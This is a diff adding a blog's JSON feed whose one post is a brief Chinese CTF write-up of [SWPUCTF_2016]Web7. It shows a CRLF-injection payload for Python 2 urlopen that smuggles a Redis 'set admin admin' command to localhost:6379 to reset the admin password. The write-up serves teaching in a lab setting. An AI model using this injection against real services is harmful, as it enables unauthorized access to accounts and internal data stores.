@@ -1,0 +1,19 @@
+{
+    "version": "https://jsonfeed.org/version/1",
+    "title": "Hexo • All posts by \"crlf\" tag",
+    "description": "",
+    "home_page_url": "http://odiws.github.io",
+    "items": [
+        {
+            "id": "http://odiws.github.io/2025/02/24/SWPUCTF-2016-Web7/",
+            "url": "http://odiws.github.io/2025/02/24/SWPUCTF-2016-Web7/",
+            "title": "[SWPUCTF_2016]Web7",
+            "date_published": "2025-02-24T13:22:28.000Z",
+            "content_html": "<h2 id=\"swpuctf_2016web7\"><a class=\"markdownIt-Anchor\" href=\"#swpuctf_2016web7\">#</a> [SWPUCTF_2016]Web7</h2>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202502242123993.png\" alt=\"image-20250224212323881\"></p>\n<p>进入就是这个，随便 aaa</p>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202502242123477.png\" alt=\"image-20250224212344321\"></p>\n<p>提示是 python2 的 urlopen 函数，就是 crlf 了，可以用 set admin admin 来设置 admin 的密码，</p>\n<p>payload：（%0d%0a 就是回车键（回车换行））通过 urllib 注入 redis。修改 admin 密码</p>\n<pre><code>submit：http://127.0.0.1%0d%0a%0d%0aset%20admin%20admin%0d%0aHost:%20127.0.0.1:6379\nlogin：admin\n</code></pre>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202502242125952.png\" alt=\"image-20250224212539675\"></p>\n<p>参考链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ndW9rZXlhLmdpdGh1Yi5pby9wb3N0L3N3cHVjdGYtMjAxNndlYjd1cmxsaWItdG91LXpodS1ydS1zc3JmLw==\">https://guokeya.github.io/post/swpuctf-2016web7urllib-tou-zhu-ru-ssrf/</span></p>\n",
+            "tags": [
+                "buuctf",
+                "CRLF"
+            ]
+        }
+    ]
+}
